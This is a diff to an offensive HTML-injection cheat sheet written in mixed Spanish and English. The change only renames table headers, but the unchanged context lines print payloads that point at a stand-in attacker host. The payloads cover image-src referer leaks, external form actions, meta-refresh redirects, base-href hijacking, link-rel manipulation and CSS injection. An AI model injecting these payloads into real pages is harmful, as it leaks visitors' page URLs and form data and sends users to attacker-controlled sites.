@@ -22,7 +22,7 @@ linked:
 
 ## Image `src` Exfil (Referer Leak)
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<img src="https://attacker/log">` | Browser fetches URL → Referer header reveals current page URL | Standard. |
 | `<img src="//attacker/log">` | Protocol-relative — same | Same. |
@@ -40,7 +40,7 @@ ___
 
 ## Form Action Redirect
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Form action external | `<form action="https://attacker/log">` overrides ANY parent form | Form override. |
 | Auto-submit no script | `<form action="..."><input type="submit"></form>` requires user click | Manual. |
@@ -57,7 +57,7 @@ ___
 
 ## Meta Refresh
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Auto-redirect | `<meta http-equiv="refresh" content="0;url=https://attacker">` | Page reloads to attacker. |
 | Delayed redirect | `<meta http-equiv="refresh" content="5;url=...">` | 5 sec delay. |
@@ -74,7 +74,7 @@ ___
 
 ## `<base href>` Hijacking
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Inject base href | `<base href="https://attacker.com/">` | All relative URLs en page rerouted. |
 | All `<img src="legit.png">` | Now load from `https://attacker.com/legit.png` | Asset hijacking. |
@@ -105,7 +105,7 @@ ___
 
 ## `<link rel>` Manipulation
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<link rel="stylesheet" href="https://attacker/style.css">` | Loads attacker's CSS | Style override. |
 | `<link rel="canonical" href="https://attacker">` | SEO canonical hijack | Search engine impact. |
@@ -124,7 +124,7 @@ ___
 
 ## CSS-Only Attacks (Cross-Site Styles)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | External CSS injection | `<link rel="stylesheet" href="https://attacker">` | Atacante controls all styling. |
 | Inline style | `<div style="background:url(//attacker/log)">` | Single element style. |
